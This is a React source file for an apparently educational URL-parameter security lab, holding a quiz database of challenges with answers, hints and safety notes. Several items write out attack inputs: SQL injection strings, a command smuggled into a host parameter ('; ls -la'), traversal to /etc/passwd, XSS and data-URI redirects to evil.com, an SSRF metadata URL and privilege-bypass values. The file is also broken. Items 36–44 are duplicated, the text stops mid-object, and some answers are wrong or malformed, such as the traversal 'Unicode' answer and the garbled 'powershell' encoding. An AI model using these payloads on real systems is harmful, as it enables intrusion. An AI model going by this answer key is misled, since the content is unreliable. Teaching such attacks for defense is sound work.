'use client'
import React, { useState, useEffect } from 'react';
import { 
  LinkIcon, 
  EyeIcon, 
  EyeSlashIcon, 
  CheckCircleIcon, 
  XCircleIcon, 
  LightBulbIcon,
  ExclamationTriangleIcon,
  CodeBracketIcon,
  GlobeAltIcon,
  ChevronRightIcon,
  ChevronLeftIcon,
  TrophyIcon,
  BookOpenIcon
} from '@heroicons/react/24/outline';
import Footer from '@/components/layout/Footer';

const URLParameterLab = () => {
  // State management with error handling
  const [currentChallenge, setCurrentChallenge] = useState(0);
  const [userAnswer, setUserAnswer] = useState('');
  const [showHint, setShowHint] = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [completedChallenges, setCompletedChallenges] = useState(new Set());
  const [score, setScore] = useState(0);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [currentTab, setCurrentTab] = useState('challenge');
  const [error, setError] = useState(null);

  // Comprehensive challenge database with 25+ challenges
  const allChallenges = [
    {
      id: 1,
      title: "Basic URL Structure Understanding",
      difficulty: "beginner",
      type: "analysis",
      scenario: "You're investigating a simple e-commerce website. Analyze this URL:",
      url: "https://shop.example.com/products?category=electronics&sort=price&order=asc",
      question: "How many parameters are in this URL?",
      answer: "3",
      hint: "Look for the ? symbol and count the key=value pairs separated by &",
      explanation: "The URL has 3 parameters: category=electronics, sort=price, and order=asc. Parameters start after the ? and are separated by & symbols.",
      safetyNote: "This is a safe analysis exercise - no actual manipulation required."
    },
    {
      id: 2,
      title: "Parameter Identification",
      difficulty: "beginner",
      type: "identification",
      scenario: "A student portal shows different content based on URL parameters.",
      url: "https://portal.school.edu/dashboard?user=student123&role=student&semester=fall2024",
      question: "What is the value of the 'role' parameter?",
      answer: "student",
      hint: "Find 'role=' in the URL and identify what comes after the equals sign",
      explanation: "The role parameter has the value 'student'. URL parameters follow the format parameter=value.",
      safetyNote: "Always verify you have permission before testing parameter changes on real systems."
    },
    {
      id: 3,
      title: "Query String Construction",
      difficulty: "beginner",
      type: "construction",
      scenario: "You need to build a URL for a search function.",
      url: "https://library.edu/search",
      question: "Add parameters: query='python programming' and type='books'. What's the complete URL?",
      answer: "https://library.edu/search?query=python programming&type=books",
      hint: "Start with ? after the path, then parameter=value pairs separated by &",
      explanation: "Query strings start with ? followed by parameter=value pairs. Multiple parameters are separated by & symbols.",
      safetyNote: "URL encoding would normally convert spaces to %20, but we're focusing on structure here."
    },
    {
      id: 4,
      title: "Parameter Modification Theory",
      difficulty: "intermediate",
      type: "theory",
      scenario: "A blog shows posts based on URL parameters.",
      url: "https://blog.example.com/posts?author=john&published=true&limit=10",
      question: "If you changed 'limit=10' to 'limit=50', what might happen?",
      answer: "The page might show 50 posts instead of 10",
      hint: "Consider what the 'limit' parameter likely controls",
      explanation: "The limit parameter appears to control how many posts are displayed. Changing it might show more or fewer posts, assuming the server respects this parameter.",
      safetyNote: "Only test parameter changes on applications you own or have explicit permission to test."
    },
    {
      id: 5,
      title: "Security Implications",
      difficulty: "intermediate",
      type: "security",
      scenario: "You notice a concerning URL pattern on a website.",
      url: "https://bank.example.com/account?user_id=12345&balance=1000&account_type=savings",
      question: "What's the main security concern with this URL structure?",
      answer: "Sensitive data in URL parameters",
      hint: "Think about what information shouldn't be visible in URLs",
      explanation: "Having sensitive data like user IDs and account balances in URL parameters is dangerous because URLs are logged, cached, and can be shared accidentally. This could lead to information disclosure.",
      safetyNote: "Never test on real banking sites. This is a theoretical security analysis."
    },
    {
      id: 6,
      title: "URL Encoding Basics",
      difficulty: "beginner",
      type: "encoding",
      scenario: "A search function needs to handle special characters in queries.",
      url: "https://search.example.com/results?q=hello%20world%21",
      question: "What does the encoded query 'hello%20world%21' decode to?",
      answer: "hello world!",
      hint: "%20 represents a space, %21 represents an exclamation mark",
      explanation: "URL encoding replaces special characters: %20 = space, %21 = !. So 'hello%20world%21' decodes to 'hello world!'.",
      safetyNote: "Understanding URL encoding helps prevent injection attacks and parsing errors."
    },
    {
      id: 7,
      title: "Multiple Parameter Values",
      difficulty: "intermediate",
      type: "analysis",
      scenario: "An online store allows multiple filters for the same category.",
      url: "https://store.example.com/products?color=red&size=large&color=blue&color=green",
      question: "How many 'color' parameters are present in this URL?",
      answer: "3",
      hint: "Count each occurrence of 'color=' in the URL",
      explanation: "There are 3 color parameters: color=red, color=blue, and color=green. Server behavior with duplicate parameters varies by implementation.",
      safetyNote: "Duplicate parameters can sometimes be exploited to bypass security filters."
    },
    {
      id: 8,
      title: "Hidden Parameter Discovery",
      difficulty: "intermediate",
      type: "discovery",
      scenario: "You suspect an admin panel has hidden parameters for debugging.",
      url: "https://admin.example.com/panel?user=guest&role=viewer",
      question: "What common debug parameter might reveal additional information?",
      answer: "debug",
      hint: "Think about parameters that enable diagnostic information",
      explanation: "Common debug parameters include 'debug', 'verbose', 'test', or 'dev_mode'. These often reveal system information not intended for public view.",
      safetyNote: "Only test for hidden parameters on systems you own or have authorization to test."
    },
    {
      id: 9,
      title: "Authentication Bypass Attempt",
      difficulty: "advanced",
      type: "security",
      scenario: "A poorly designed application uses URL parameters for access control.",
      url: "https://secure.example.com/admin?authenticated=false&admin=no",
      question: "What parameter value changes might bypass authentication?",
      answer: "authenticated=true&admin=yes",
      hint: "Consider changing the boolean values to grant access",
      explanation: "Changing authenticated=false to authenticated=true and admin=no to admin=yes might bypass client-side authentication checks.",
      safetyNote: "Client-side authentication is fundamentally insecure. Never rely on URL parameters for real security."
    },
    {
      id: 10,
      title: "SQL Injection Vector",
      difficulty: "advanced",
      type: "security",
      scenario: "A vulnerable search function constructs SQL queries from parameters.",
      url: "https://vulnerable.example.com/search?id=123&table=users",
      question: "What SQL injection payload might be attempted in the 'id' parameter?",
      answer: "' OR '1'='1",
      hint: "Think about breaking out of a SQL query with quotes",
      explanation: "The payload ' OR '1'='1 attempts to break out of the SQL query and add a condition that's always true, potentially revealing all records.",
      safetyNote: "Never attempt SQL injection on sites you don't own. This knowledge is for defensive purposes only."
    },
    {
      id: 11,
      title: "Directory Traversal Attack",
      difficulty: "advanced",
      type: "security",
      scenario: "A file viewer application uses parameters to specify file paths.",
      url: "https://docs.example.com/view?file=../../../etc/passwd",
      question: "What type of attack does this file parameter demonstrate?",
      answer: "Directory traversal",
      hint: "Look at the ../ sequences in the file path",
      explanation: "The ../ sequences attempt to navigate up directory levels to access files outside the intended directory, like system files.",
      safetyNote: "Directory traversal can expose sensitive system files. Only test on your own systems."
    },
    {
      id: 12,
      title: "XSS Through Parameters",
      difficulty: "advanced",
      type: "security",
      scenario: "A search page displays the search term from URL parameters.",
      url: "https://search.example.com/results?q=<script>alert('xss')</script>",
      question: "What security vulnerability does this demonstrate?",
      answer: "Cross-Site Scripting",
      hint: "Notice the JavaScript code in the parameter value",
      explanation: "If the search term is displayed without proper encoding, the JavaScript could execute, demonstrating XSS vulnerability.",
      safetyNote: "Never test XSS on sites you don't own. Modern browsers have built-in protections against many XSS attacks."
    },
    {
      id: 13,
      title: "Parameter Pollution Attack",
      difficulty: "advanced",
      type: "security",
      scenario: "Testing how a payment system handles duplicate parameters.",
      url: "https://pay.example.com/transfer?from=user1&to=user2&amount=100&to=attacker",
      question: "What security risk does parameter pollution create here?",
      answer: "Payment misdirection",
      hint: "Consider which 'to' parameter the server might use",
      explanation: "Different servers handle duplicate parameters differently. The payment might go to 'user2', 'attacker', or both, creating security risks.",
      safetyNote: "Parameter pollution can bypass security controls. Understanding this helps build more secure applications."
    },
    {
      id: 14,
      title: "Template Injection Discovery",
      difficulty: "expert",
      type: "security",
      scenario: "A web application uses URL parameters in server-side templates.",
      url: "https://app.example.com/welcome?name={{7*7}}",
      question: "If the page shows '49' instead of '{{7*7}}', what vulnerability exists?",
      answer: "Template injection",
      hint: "The mathematical expression was evaluated by the server",
      explanation: "If {{7*7}} evaluates to 49, the server is processing template syntax, indicating server-side template injection.",
      safetyNote: "Template injection can lead to remote code execution. This is an advanced vulnerability requiring careful analysis."
    },
    {
      id: 15,
      title: "Session Manipulation",
      difficulty: "intermediate",
      type: "security",
      scenario: "A web application exposes session data in URL parameters.",
      url: "https://app.example.com/dashboard?session_id=abc123&user_level=basic",
      question: "What might happen if you change 'user_level=basic' to 'user_level=admin'?",
      answer: "Privilege escalation",
      hint: "Consider what user_level controls in the application",
      explanation: "If the application trusts the user_level parameter, changing it to 'admin' might grant administrative privileges.",
      safetyNote: "Session data should never be trusted from client-side parameters. Always validate on the server."
    },
    {
      id: 16,
      title: "API Parameter Fuzzing",
      difficulty: "intermediate",
      type: "discovery",
      scenario: "You're testing an API endpoint for undocumented parameters.",
      url: "https://api.example.com/users?limit=10&format=json",
      question: "What parameter might reveal additional user information?",
      answer: "include_private",
      hint: "Think about parameters that might include normally hidden data",
      explanation: "Parameters like 'include_private', 'show_all', or 'admin_view' might reveal additional information not normally shown.",
      safetyNote: "API fuzzing should only be done on APIs you own or have permission to test."
    },
    {
      id: 17,
      title: "Cache Poisoning Vector",
      difficulty: "advanced",
      type: "security",
      scenario: "A caching system treats certain parameters differently.",
      url: "https://cached.example.com/page?utm_source=email&cache_key=poisoned",
      question: "How might the 'cache_key' parameter be exploited?",
      answer: "Cache poisoning",
      hint: "Consider how controlling the cache key might affect other users",
      explanation: "If the cache_key parameter influences caching behavior, an attacker might poison the cache to serve malicious content to other users.",
      safetyNote: "Cache poisoning requires deep understanding of caching mechanisms and should only be tested ethically."
    },
    {
      id: 18,
      title: "LDAP Injection Potential",
      difficulty: "advanced",
      type: "security",
      scenario: "A directory service search uses URL parameters for LDAP queries.",
      url: "https://directory.example.com/search?username=admin&filter=(objectClass=*)",
      question: "What LDAP injection payload might be attempted in the username parameter?",
      answer: "*)(objectClass=*",
      hint: "Think about breaking out of LDAP query syntax",
      explanation: "LDAP injection attempts to manipulate LDAP queries. The payload *)(objectClass=* tries to break query logic.",
      safetyNote: "LDAP injection can expose directory information. Only test on systems you own."
    },
    {
      id: 19,
      title: "Command Injection Risk",
      difficulty: "expert",
      type: "security",
      scenario: "A system administration tool uses parameters in system commands.",
      url: "https://admin.example.com/ping?host=google.com&count=4",
      question: "What command injection payload might be attempted in the host parameter?",
      answer: "google.com; ls -la",
      hint: "Think about chaining commands with semicolons",
      explanation: "Command injection attempts like 'google.com; ls -la' try to execute additional commands on the server.",
      safetyNote: "Command injection is extremely dangerous and can lead to full system compromise. Never test this on systems you don't own."
    },
    {
      id: 20,
      title: "Business Logic Bypass",
      difficulty: "intermediate",
      type: "security",
      scenario: "An e-commerce site uses parameters for pricing calculations.",
      url: "https://shop.example.com/checkout?item=laptop&price=1000&discount=0",
      question: "What parameter manipulation might bypass business logic?",
      answer: "discount=100",
      hint: "Consider changing the discount to an unexpected value",
      explanation: "Setting discount=100 (100%) might bypass business logic if the application doesn't validate the discount range properly.",
      safetyNote: "Business logic flaws can have financial impacts. Responsible disclosure is essential when found."
    },
    {
      id: 21,
      title: "File Upload Bypass",
      difficulty: "intermediate",
      type: "security",
      scenario: "A file upload system checks file types via parameters.",
      url: "https://upload.example.com/submit?filename=document.pdf&type=pdf&size=1024",
      question: "How might changing the 'type' parameter bypass file type restrictions?",
      answer: "Change type to allowed format",
      hint: "Consider changing the type parameter while keeping a malicious file",
      explanation: "If validation relies on the 'type' parameter instead of actual file content, changing it might bypass restrictions.",
      safetyNote: "File upload vulnerabilities can lead to remote code execution. Test only on your own systems."
    },
    {
      id: 22,
      title: "Rate Limiting Bypass",
      difficulty: "intermediate",
      type: "security",
      scenario: "An API implements rate limiting based on URL parameters.",
      url: "https://api.example.com/data?api_key=12345&user_id=user1&bypass_limit=false",
      question: "What parameter change might bypass rate limiting?",
      answer: "bypass_limit=true",
      hint: "Look for parameters that might control rate limiting behavior",
      explanation: "Hidden parameters like 'bypass_limit', 'no_limit', or 'admin_key' might bypass rate limiting controls.",
      safetyNote: "Rate limiting bypasses can enable abuse. Identify and report these issues responsibly."
    },
    {
      id: 23,
      title: "Information Disclosure",
      difficulty: "beginner",
      type: "security",
      scenario: "A user profile page shows information based on parameters.",
      url: "https://social.example.com/profile?user_id=123&show_private=false&debug_info=off",
      question: "What parameters might reveal additional user information?",
      answer: "show_private=true",
      hint: "Look for parameters that control information visibility",
      explanation: "Parameters like 'show_private=true' or 'debug_info=on' might reveal information not intended for public view.",
      safetyNote: "Information disclosure can violate privacy. Always respect user data protection requirements."
    },
    {
      id: 24,
      title: "Redirect Manipulation",
      difficulty: "intermediate",
      type: "security",
      scenario: "A login system uses parameters for post-login redirects.",
      url: "https://auth.example.com/login?redirect=https://internal.company.com/dashboard",
      question: "What security risk does the redirect parameter create?",
      answer: "Open redirect",
      hint: "Consider what happens if the redirect URL is changed to a malicious site",
      explanation: "Open redirects allow attackers to redirect users to malicious sites, potentially for phishing attacks.",
      safetyNote: "Open redirects enable phishing attacks. Validate all redirect destinations."
    },
    {
      id: 25,
      title: "JSON Parameter Injection",
      difficulty: "advanced",
      type: "security",
      scenario: "An API accepts JSON data through URL parameters.",
      url: "https://api.example.com/update?data={\"user\":\"john\",\"role\":\"user\"}",
      question: "How might the JSON in the data parameter be manipulated?",
      answer: "Change role to admin",
      hint: "Consider modifying the JSON structure to change the role value",
      explanation: "If the JSON is parsed without validation, changing the role from 'user' to 'admin' might escalate privileges.",
      safetyNote: "JSON injection can bypass application logic. Always validate and sanitize JSON input."
    },
    {
  id: 26,
  title: "Basic Open Redirect Detection",
  difficulty: "intermediate",
  type: "security",
  scenario: "A login system redirects users after authentication using a URL parameter.",
  url: "https://secure.example.com/login?redirect_url=https://malicious.com/phishing",
  question: "What security vulnerability does this redirect parameter create?",
  answer: "Open redirect vulnerability",
  hint: "Consider where users might be redirected after login",
  explanation: "Open redirects allow attackers to redirect users to malicious sites after legitimate authentication, enabling phishing attacks.",
  safetyNote: "Open redirects are commonly exploited in phishing campaigns. Always validate redirect destinations."
},
{
  id: 27,
  title: "URL Redirect Validation Bypass",
  difficulty: "advanced",
  type: "security",
  scenario: "A site validates redirects but has a whitelist bypass vulnerability.",
  url: "https://bank.com/redirect?url=https://bank.com.evil.com/steal-credentials",
  question: "How does this URL bypass domain validation that only allows 'bank.com'?",
  answer: "Subdomain spoofing",
  hint: "Look closely at the domain structure in the redirect URL",
  explanation: "The URL uses 'bank.com.evil.com' which appears to contain 'bank.com' but actually redirects to 'evil.com', bypassing simple string-matching validation.",
  safetyNote: "Subdomain spoofing bypasses weak validation. Use proper domain parsing for redirect validation."
},
{
  id: 28,
  title: "Protocol Manipulation in Redirects",
  difficulty: "advanced",
  type: "security",
  scenario: "An application validates HTTP/HTTPS redirects but allows other protocols.",
  url: "https://app.example.com/redirect?next=javascript:alert('XSS')",
  question: "What attack vector does the 'javascript:' protocol enable?",
  answer: "JavaScript execution",
  hint: "Consider what happens when a browser processes a javascript: URL",
  explanation: "The javascript: protocol executes JavaScript code directly, turning an open redirect into XSS. Modern browsers block this, but legacy systems may be vulnerable.",
  safetyNote: "Always whitelist allowed protocols in redirect validation. Block javascript:, data:, and other dangerous protocols."
},
{
  id: 29,
  title: "Data URI Redirect Exploitation",
  difficulty: "expert",
  type: "security",
  scenario: "A redirect system allows data URIs, creating a complex attack vector.",
  url: "https://trusted.com/go?url=data:text/html,<script>location.href='https://evil.com'</script>",
  question: "How does this data URI redirect enable malicious behavior?",
  answer: "Inline HTML execution",
  hint: "The data URI contains HTML that executes when loaded",
  explanation: "Data URIs can contain inline HTML/JavaScript that executes when the redirect loads, enabling complex attacks while appearing to stay on the trusted domain.",
  safetyNote: "Data URIs in redirects are extremely dangerous. They can execute arbitrary code while maintaining the trusted domain in the address bar."
},
{
  id: 30,
  title: "Double URL Encoding Bypass",
  difficulty: "advanced",
  type: "security",
  scenario: "A system validates redirects but can be bypassed with double encoding.",
  url: "https://shop.com/redirect?next=%2568%2574%2574%2570%253a%252f%252fevil.com",
  question: "What does this double-encoded redirect URL decode to?",
  answer: "http://evil.com",
  hint: "Try decoding the URL twice - first %25 becomes %, then the rest decodes",
  explanation: "Double encoding bypasses filters: %2568%2574... → %68%74... → http://evil.com. The first decode reveals another encoded URL.",
  safetyNote: "Always decode URLs completely before validation. Attackers use multiple encoding layers to bypass filters."
},
{
  id: 31,
  title: "Relative Path Redirect Confusion",
  difficulty: "intermediate",
  type: "security",
  scenario: "A redirect system expects relative paths but accepts absolute URLs.",
  url: "https://company.com/redirect?path=//attacker.com/fake-login",
  question: "Where does the redirect '//attacker.com/fake-login' actually point?",
  answer: "https://attacker.com/fake-login",
  hint: "URLs starting with // inherit the current protocol",
  explanation: "Protocol-relative URLs (//domain.com) inherit the current protocol. This redirects to https://attacker.com while appearing to be a relative path.",
  safetyNote: "Protocol-relative URLs can bypass validation that only checks for http:// or https://. Validate the domain portion too."
},
{
  id: 32,
  title: "Fragment-Based Redirect Bypass",
  difficulty: "advanced",
  type: "security",
  scenario: "A client-side redirect system uses URL fragments for navigation.",
  url: "https://app.com/dashboard#/redirect?url=https://malicious.com",
  question: "Why might fragment-based redirects be harder to detect server-side?",
  answer: "Fragments not sent to server",
  hint: "Consider what part of a URL is sent to the server vs handled by the browser",
  explanation: "URL fragments (#...) are handled client-side and never sent to the server, making server-side validation impossible for fragment-based redirects.",
  safetyNote: "Client-side redirects using fragments require client-side validation. Server-side protections cannot see fragment data."
},
{
  id: 33,
  title: "Unicode Domain Redirect Attack",
  difficulty: "expert",
  type: "security",
  scenario: "An attacker uses Unicode characters to create a deceptive redirect.",
  url: "https://bank.com/redirect?next=https://bаnk.com/login",
  question: "What makes this redirect URL deceptive despite looking legitimate?",
  answer: "Unicode character substitution",
  hint: "Look very carefully at the characters in 'bank' - some might not be standard ASCII",
  explanation: "The 'a' in 'bаnk.com' is actually a Cyrillic 'а' (U+0430), making it a different domain that looks identical to 'bank.com'.",
  safetyNote: "Internationalized domain names (IDN) can be used for homograph attacks. Modern browsers warn about mixed scripts, but validation should normalize Unicode."
},
{
  id: 34,
  title: "Redirect Chain Exploitation",
  difficulty: "advanced",
  type: "security",
  scenario: "A system allows redirects to trusted domains, but those domains have their own redirects.",
  url: "https://secure.com/redirect?next=https://trusted-partner.com/redirect?url=https://malicious.com",
  question: "How does this redirect chain bypass domain whitelisting?",
  answer: "Indirect redirect through trusted domain",
  hint: "The first redirect goes to a trusted domain, which then redirects elsewhere",
  explanation: "By redirecting to a trusted domain that has its own redirect functionality, attackers can bounce through whitelisted domains to reach malicious sites.",
  safetyNote: "Whitelist validation must consider that trusted domains might have their own redirect functionality. Monitor redirect chains."
},
{
  id: 35,
  title: "SSRF via Redirect Parameter",
  difficulty: "expert",
  type: "security",
  scenario: "A server-side redirect validator makes requests to validate URLs, creating SSRF potential.",
  url: "https://app.com/redirect?url=http://169.254.169.254/latest/meta-data/",
  question: "What vulnerability does this internal AWS metadata URL exploit?",
  answer: "Server-Side Request Forgery",
  hint: "Consider what happens if the server validates this URL by making a request to it",
  explanation: "If the server validates redirects by making HTTP requests, attackers can force it to request internal services like AWS metadata, creating SSRF vulnerabilities.",
  safetyNote: "Server-side URL validation can create SSRF vulnerabilities. Use static analysis rather than making requests to validate URLs."
},
{
  id: 36,
  title: "Log Analysis for URL Attacks",
  difficulty: "intermediate",
  type: "defense",
  scenario: "You're analyzing web server logs and notice suspicious URL patterns.",
  url: "GET /search?q=%27%20OR%20%271%27%3D%271&category=all HTTP/1.1",
  question: "What type of attack pattern should blue teamers flag in this URL?",
  answer: "SQL injection attempt",
  hint: "Decode the URL parameters and look for SQL syntax",
  explanation: "The URL-encoded payload '%27%20OR%20%271%27%3D%271' decodes to ' OR '1'='1, a classic SQL injection pattern that blue teams should detect in logs.",
  safetyNote: "Automated log analysis can detect SQL injection patterns. Implement real-time alerting for such signatures."
},
{
  id: 37,
  title: "WAF Bypass Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "Attackers are using various encoding techniques to bypass your WAF rules.",
  url: "https://app.com/search?q=uni%c0%afon+sel%c0%afect+from+users",
  question: "What WAF bypass technique is being used with these encoded characters?",
  answer: "UTF-8 overlong encoding",
  hint: "Look at the %c0%af sequences - they represent overlong UTF-8 encoding",
  explanation: "Overlong UTF-8 encoding (%c0%af = '/') can bypass WAF rules that don't properly normalize UTF-8. Blue teams need detection for various encoding bypasses.",
  safetyNote: "WAF rules must normalize all character encodings. Monitor for overlong UTF-8, double encoding, and mixed encoding attacks."
},
{
  id: 38,
  title: "Parameter Pollution Attack Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "You notice duplicate parameters in logs that might indicate bypass attempts.",
  url: "https://bank.com/transfer?amount=1&to=victim&amount=1000000&to=attacker",
  question: "What defensive measure should detect this parameter pollution attack?",
  answer: "Duplicate parameter monitoring",
  hint: "Count parameter occurrences and flag when the same parameter appears multiple times",
  explanation: "Parameter pollution attacks use duplicate parameters to bypass validation. Blue teams should monitor for and alert on duplicate parameter names.",
  safetyNote: "Implement parameter counting in logs. Different web servers handle duplicates differently, creating security gaps."
},
{
  id: 39,
  title: "Abnormal URL Length Detection",
  difficulty: "intermediate",
  type: "defense",
  scenario: "Your monitoring system flags unusually long URLs that might indicate attacks.",
  url: "https://app.com/page?data=" + "A".repeat(8000) + "&cmd=payload",
  question: "What type of attack might use extremely long URL parameters?",
  answer: "Buffer overflow or DoS attempt",
  hint: "Consider what happens when applications process very large URL parameters",
  explanation: "Extremely long URLs can cause buffer overflows, memory exhaustion, or DoS. Blue teams should set and monitor URL length limits.",
  safetyNote: "Set maximum URL and parameter length limits. Monitor for URLs exceeding normal application patterns."
},
{
  id: 40,
  title: "Directory Traversal Pattern Recognition",
  difficulty: "intermediate",
  type: "defense",
  scenario: "Your IDS is configured to detect directory traversal attempts in URLs.",
  url: "https://files.com/download?file=....//....//....//etc/passwd",
  question: "What obfuscation technique is used in this directory traversal attempt?",
  answer: "Unicode dot encoding",
  hint: "Look for unusual representations of ../ sequences",
  explanation: "Attackers use various encodings like ....// (quad dots) or Unicode variations of ../ to bypass simple pattern matching.",
  safetyNote: "Directory traversal detection must account for encoding variations, Unicode normalization, and path canonicalization."
},
{
  id: 41,
  title: "Suspicious User-Agent Correlation",
  difficulty: "advanced",
  type: "defense",
  scenario: "You're correlating suspicious URLs with User-Agent strings in your SIEM.",
  url: "https://admin.com/config?debug=true&show_passwords=1",
  question: "What User-Agent pattern should raise suspicion with this admin URL access?",
  answer: "Automated scanner signatures",
  hint: "Think about what tools attackers use to discover hidden parameters",
  explanation: "URLs accessing hidden parameters combined with scanner User-Agents (like 'sqlmap', 'Burp', 'OWASP ZAP') indicate reconnaissance or automated attacks.",
  safetyNote: "Correlate suspicious URLs with User-Agent strings. Automated tools often have identifiable signatures."
},
{
  id: 42,
  title: "Time-Based Attack Pattern Analysis",
  difficulty: "advanced",
  type: "defense",
  scenario: "You notice URLs with sleep functions being called, indicating time-based attacks.",
  url: "https://db.com/query?id=1';WAITFOR+DELAY+'00:00:05'--",
  question: "What blue team metric should spike when detecting this time-based SQL injection?",
  answer: "Response time anomalies",
  hint: "Time-based attacks deliberately slow down responses",
  explanation: "Time-based SQL injection creates response delays. Blue teams should monitor for response time anomalies correlated with suspicious SQL syntax.",
  safetyNote: "Monitor response times alongside URL patterns. Time-based attacks create detectable latency signatures."
},
{
  id: 43,
  title: "Encoded Payload Staging Detection",
  difficulty: "expert",
  type: "defense",
  scenario: "Attackers are using multiple encoding layers to hide payloads in URLs.",
  url: "https://app.com/exec?cmd=%252570%25256f%25257%252565%252572%25252573%252568%252565%25256c%25256c",
  question: "How many encoding layers should blue team tools decode to reveal the true payload?",
  answer: "Multiple layers until stable",
  hint: "Keep decoding until the string no longer changes",
  explanation: "This is triple-encoded 'powershell'. Blue teams need recursive decoding capabilities to reveal deeply nested payloads used by advanced attackers.",
  safetyNote: "Implement recursive URL decoding in detection systems. Attackers use multiple encoding layers to evade signature-based detection."
},
{
  id: 44,
  title: "API Abuse Pattern Recognition",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your API endpoints are being probed for sensitive data exposure.",
  url: "https://api.com/users/123?fields=password,ssn,credit_card&include_private=true&admin_view=1",
  question: "What API security pattern should trigger immediate blue team investigation?",
  answer: "Sensitive field enumeration",
  hint: "Look for attempts to access fields that should never be exposed",
  explanation: "Requests for sensitive fields like 'password', 'ssn', 'credit_card' combined with privilege escalation parameters indicate API abuse reconnaissance.",
  safetyNote: "Monitor API field access patterns. Alert on requests for sensitive field names regardless of whether they exist."
},
{
  id: 45,
  title: "Supply Chain Attack URL Indicators",
  difficulty: "expert",
  type: "defense",
  scenario: "You're investigating potential supply chain compromise through URL analysis.",
  url: "https://cdn.legitimate-library.com/v1.2.3/library.js?callback=eval&payload=dmFyIHM9ZG9jdW1lbnQ=",
  question: "What supply chain attack indicator should blue teams detect in this CDN URL?",
  answer: "JSONP callback manipulation",
  hint: "Look at the callback parameter and consider what 'eval' might enable",
  explanation: "Using 'eval' as a JSONP callback with base64 payloads indicates potential supply chain compromise where CDN resources are weaponized for code execution.",
  safetyNote: "Monitor CDN and third-party resource URLs for suspicious callbacks, unexpected parameters, and encoded payloads."
},
{
  id: 36,
  title: "Log Analysis for URL Attacks",
  difficulty: "intermediate",
  type: "defense",
  scenario: "You're analyzing web server logs and notice suspicious URL patterns.",
  url: "GET /search?q=%27%20OR%20%271%27%3D%271&category=all HTTP/1.1",
  question: "What type of attack pattern should blue teamers flag in this URL?",
  answer: "SQL injection attempt",
  hint: "Decode the URL parameters and look for SQL syntax",
  explanation: "The URL-encoded payload '%27%20OR%20%271%27%3D%271' decodes to ' OR '1'='1, a classic SQL injection pattern that blue teams should detect in logs.",
  safetyNote: "Automated log analysis can detect SQL injection patterns. Implement real-time alerting for such signatures."
},
{
  id: 37,
  title: "WAF Bypass Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "Attackers are using various encoding techniques to bypass your WAF rules.",
  url: "https://app.com/search?q=uni%c0%afon+sel%c0%afect+from+users",
  question: "What WAF bypass technique is being used with these encoded characters?",
  answer: "UTF-8 overlong encoding",
  hint: "Look at the %c0%af sequences - they represent overlong UTF-8 encoding",
  explanation: "Overlong UTF-8 encoding (%c0%af = '/') can bypass WAF rules that don't properly normalize UTF-8. Blue teams need detection for various encoding bypasses.",
  safetyNote: "WAF rules must normalize all character encodings. Monitor for overlong UTF-8, double encoding, and mixed encoding attacks."
},
{
  id: 38,
  title: "Parameter Pollution Attack Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "You notice duplicate parameters in logs that might indicate bypass attempts.",
  url: "https://bank.com/transfer?amount=1&to=victim&amount=1000000&to=attacker",
  question: "What defensive measure should detect this parameter pollution attack?",
  answer: "Duplicate parameter monitoring",
  hint: "Count parameter occurrences and flag when the same parameter appears multiple times",
  explanation: "Parameter pollution attacks use duplicate parameters to bypass validation. Blue teams should monitor for and alert on duplicate parameter names.",
  safetyNote: "Implement parameter counting in logs. Different web servers handle duplicates differently, creating security gaps."
},
{
  id: 39,
  title: "Abnormal URL Length Detection",
  difficulty: "intermediate",
  type: "defense",
  scenario: "Your monitoring system flags unusually long URLs that might indicate attacks.",
  url: "https://app.com/page?data=" + "A".repeat(8000) + "&cmd=payload",
  question: "What type of attack might use extremely long URL parameters?",
  answer: "Buffer overflow or DoS attempt",
  hint: "Consider what happens when applications process very large URL parameters",
  explanation: "Extremely long URLs can cause buffer overflows, memory exhaustion, or DoS. Blue teams should set and monitor URL length limits.",
  safetyNote: "Set maximum URL and parameter length limits. Monitor for URLs exceeding normal application patterns."
},
{
  id: 40,
  title: "Directory Traversal Pattern Recognition",
  difficulty: "intermediate",
  type: "defense",
  scenario: "Your IDS is configured to detect directory traversal attempts in URLs.",
  url: "https://files.com/download?file=....//....//....//etc/passwd",
  question: "What obfuscation technique is used in this directory traversal attempt?",
  answer: "Unicode dot encoding",
  hint: "Look for unusual representations of ../ sequences",
  explanation: "Attackers use various encodings like ....// (quad dots) or Unicode variations of ../ to bypass simple pattern matching.",
  safetyNote: "Directory traversal detection must account for encoding variations, Unicode normalization, and path canonicalization."
},
{
  id: 41,
  title: "Suspicious User-Agent Correlation",
  difficulty: "advanced",
  type: "defense",
  scenario: "You're correlating suspicious URLs with User-Agent strings in your SIEM.",
  url: "https://admin.com/config?debug=true&show_passwords=1",
  question: "What User-Agent pattern should raise suspicion with this admin URL access?",
  answer: "Automated scanner signatures",
  hint: "Think about what tools attackers use to discover hidden parameters",
  explanation: "URLs accessing hidden parameters combined with scanner User-Agents (like 'sqlmap', 'Burp', 'OWASP ZAP') indicate reconnaissance or automated attacks.",
  safetyNote: "Correlate suspicious URLs with User-Agent strings. Automated tools often have identifiable signatures."
},
{
  id: 42,
  title: "Time-Based Attack Pattern Analysis",
  difficulty: "advanced",
  type: "defense",
  scenario: "You notice URLs with sleep functions being called, indicating time-based attacks.",
  url: "https://db.com/query?id=1';WAITFOR+DELAY+'00:00:05'--",
  question: "What blue team metric should spike when detecting this time-based SQL injection?",
  answer: "Response time anomalies",
  hint: "Time-based attacks deliberately slow down responses",
  explanation: "Time-based SQL injection creates response delays. Blue teams should monitor for response time anomalies correlated with suspicious SQL syntax.",
  safetyNote: "Monitor response times alongside URL patterns. Time-based attacks create detectable latency signatures."
},
{
  id: 43,
  title: "Encoded Payload Staging Detection",
  difficulty: "expert",
  type: "defense",
  scenario: "Attackers are using multiple encoding layers to hide payloads in URLs.",
  url: "https://app.com/exec?cmd=%252570%25256f%25257%252565%252572%25252573%252568%252565%25256c%25256c",
  question: "How many encoding layers should blue team tools decode to reveal the true payload?",
  answer: "Multiple layers until stable",
  hint: "Keep decoding until the string no longer changes",
  explanation: "This is triple-encoded 'powershell'. Blue teams need recursive decoding capabilities to reveal deeply nested payloads used by advanced attackers.",
  safetyNote: "Implement recursive URL decoding in detection systems. Attackers use multiple encoding layers to evade signature-based detection."
},
{
  id: 44,
